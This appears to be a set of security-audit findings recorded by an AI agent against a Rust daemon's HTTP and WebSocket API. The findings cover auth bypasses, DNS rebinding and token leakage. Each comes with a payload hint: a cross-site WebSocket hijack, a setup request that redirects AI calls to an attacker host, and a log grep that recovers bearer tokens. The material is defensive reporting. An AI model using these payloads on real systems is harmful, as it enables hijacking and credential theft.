---
record_exploration_finding
{
  "path": "crates/nyctos-api/src/router.rs",
  "line": 1660,
  "cap": "AUTH_BYPASS",
  "endpoint": "GET /api/v1/events (WebSocket upgrade)",
  "rationale": "events_ws performs no Origin-header check before on_upgrade (router.rs:1677). WebSockets are not subject to the SOP same-origin restriction that gates fetch(); any cross-origin page the operator visits can open ws://127.0.0.1:<port>/api/v1/events and stream every AgentEvent (scan output, repo paths, finding bodies). The bearer-token gate runs first, but the fallback `?token=` URL-query auth (router.rs:141) means a token leaked via Referer / browser history / TraceLayer logs is enough to mount a Cross-Site WebSocket Hijack. Missed by the static pass because the bypass is a *missing* check, not a tainted-flow sink.",
  "suggested_payload_hint": "from a non-loopback origin: new WebSocket('ws://127.0.0.1:8088/api/v1/events?token='+leakedToken) — confirm operator-side run events stream out cross-origin."
}

---
record_exploration_finding
{
  "path": "crates/nyctos-api/src/router.rs",
  "line": 111,
  "cap": "AUTH_BYPASS",
  "endpoint": "POST /api/v1/setup (pre-config window)",
  "rationale": "auth_layer exempts /api/v1/setup, /setup/status, /setup/doctor whenever state.setup.is_complete() is false (router.rs:111-113, is_setup_path at :127). Between daemon start and the operator's first wizard submission, anyone who can reach the listener can POST a SetupRequest with i_own_this:true (single-bit attestation, not a challenge — see :296), sandbox_backend:'process' (disables kernel isolation), and ai_runtime:'local-llm' + attacker-controlled local_llm_url, then watch all subsequent AI calls flow to their endpoint. Race window is short on a warm install but unbounded on a fresh provision; the same window reopens any time nyctos.toml is deleted/moved (setup.is_complete is a live filesystem check). Static pass missed this because the *intended* policy and the *bypassable* policy share the same code path — the bug is a state-machine flaw (transient-trust window), not a tainted sink.",
  "suggested_payload_hint": "POST /api/v1/setup, Content-Type: application/json, body {\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"https://attacker/api\",\"sandbox_backend\":\"process\",\"i_own_this\":true}"
}

---
record_exploration_finding
{
  "path": "crates/nyctos/src/main.rs",
  "line": 1035,
  "cap": "DNS_REBIND",
  "endpoint": "all /api/v1/* via operator-configured listen_addr",
  "rationale": "TcpListener::bind uses config.ui.listen_addr verbatim (main.rs:947 resolves from CLI/config; bind at :1035). No Host-header allowlist anywhere in the router (grep for Host/host_header in nyctos-api returns zero hits). If listen_addr is 0.0.0.0 (common foot-gun) or the operator merely visits a malicious page while the daemon is bound to 127.0.0.1, DNS-rebinding resolves attacker-controlled hostnames to 127.0.0.1 after the first response, so subsequent fetches from the foreign origin hit the loopback API with browser-side SOP satisfied. Combined with `?token=` URL-query auth (router.rs:141) and absent CorsLayer, a rebind primitive lets a remote attacker pivot to full API access once any token leaks. Static pass missed because no flow is involved — the gap is the absence of `host == 127.0.0.1 || host == localhost` middleware.",
  "suggested_payload_hint": "DNS server with 5s TTL: first answer = attacker IP, second answer = 127.0.0.1; victim visits http://rebind.example/, JS calls fetch('/api/v1/runs?token=<guess>')."
}

---
record_exploration_finding
{
  "path": "crates/nyctos-api/src/router.rs",
  "line": 141,
  "cap": "CRED_EXPOSURE",
  "endpoint": "all auth-gated /api/v1/* (token in ?token=)",
  "rationale": "check_query_token accepts the bearer in the URL query string (router.rs:141-152). TraceLayer::new_for_http() (router.rs:89) writes the request URI to tracing output by default, so every authenticated request logs the bearer in cleartext to whatever subscriber the operator wired (stderr, file, journald, etc). URL-query tokens also leak via browser history, Referer on navigation, and any reverse-proxy access log placed in front of the daemon. The constant-time comparison at :154 is defeated upstream because the secret already crossed three logging surfaces. Static pass missed because the bug is a misuse pattern (logging-by-default of a transport-level secret), not a missing escape.",
  "suggested_payload_hint": "grep daemon stderr / journald output for 'token=' after any authenticated GET; confirm the bearer is recoverable from logs."
}

---
record_exploration_finding
{
  "path": "crates/nyctos-api/src/router.rs",
  "line": 1660,
  "cap": "CRED_EXPOSURE",
  "endpoint": "GET /api/v1/events (WS handshake forces query-token branch)",
  "rationale": "The /api/v1/events endpoint is structurally locked into the query-token auth branch because browsers cannot set the Authorization header on a WebSocket upgrade — the WebSocket constructor exposes no header API. Any UI or third-party client that opens this stream from a browser MUST embed the bearer in `?token=<bearer>` (router.rs:141), guaranteeing the secret hits TraceLayer's URI logging on every WS handshake. Unlike fetch() callers who can choose Authorization-header auth, WS clients have no opt-out. Compounded with finding #1 (no Origin check) this means: every UI session writes the bearer to logs, and any cross-origin page can replay it. Static pass missed this composition because it requires recognising both the WS browser-API constraint and the logging surface together.",
  "suggested_payload_hint": "open the operator UI, then `journalctl -u nyctos | grep -oE 'token=[A-Za-z0-9_-]+' | head` — first hit is the live bearer."
}
